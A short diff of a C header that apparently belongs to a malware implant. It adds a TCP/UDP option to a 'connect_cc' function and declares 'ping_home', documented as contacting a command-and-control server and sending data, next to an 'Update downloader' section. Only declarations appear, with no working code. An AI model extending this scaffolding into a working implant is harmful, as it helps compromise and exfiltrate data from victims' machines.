@@ -17,7 +17,20 @@
  * 
  * Returns - OK or ERROR
 */
-int connect_cc(char *ip_adrr, int port, int *socket_desc, struct sockaddr_in *server);
+int connect_cc(char *ip_adrr, int port, int *socket_desc,
+	       struct sockaddr_in *server, int isTCP);
+
+/** 
+ * Sends some data through UDP
+ * 
+ * Connects to the command and cotrol server and sends data
+ * 
+ * ip_addr - String with ip address of the listener
+ * port - int where the port goes.
+ * 
+ * Returns - OK or ERROR
+*/
+int ping_home(char *ip_addr, int port);
 
 /** 
  * Update downloader
